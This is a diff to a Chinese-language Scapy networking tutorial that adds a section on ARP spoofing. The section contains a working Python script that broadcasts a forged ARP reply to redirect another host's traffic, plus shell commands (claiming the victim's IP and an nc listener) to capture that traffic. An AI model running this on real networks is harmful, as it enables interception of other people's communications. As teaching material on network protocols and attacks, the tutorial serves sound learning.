@@ -30,6 +30,7 @@ comments: true
   - [4.3 发送TCP报文](#43-发送tcp报文)
   - [4.4 TCP三次握手](#44-tcp三次握手)
   - [4.5 发送ARP报文](#45-发送arp报文)
+  - [4.6 arp欺骗](#46-arp欺骗)
 
 
 ## 前言<br>
@@ -457,4 +458,25 @@ ether = Ether()
 packet = ether/arp
 packet.show()
 sendp(packet,iface="eth0")
+```
+
+### 4.6 arp欺骗<br>
+```python
+import scapy
+from scapy.all import *
+import time
+
+arp =ARP(op="is-at",psrc="10.0.0.2",pdst="10.0.0.4")
+#arp.show()
+ether=Ether()
+ether.dst="ff:ff:ff:ff:ff:ff" # 广播，告诉10.0.0.4，10.0.0.2的mac地址是xxxxx
+packet = ether/arp
+packet.show()
+
+sendp(packet,iface="eth0") 
+```
+要想在本地监听到报文，需要:<br>
+```
+ip addr add 10.0.0.2/24 dev eth0
+nc -l 31337
 ```
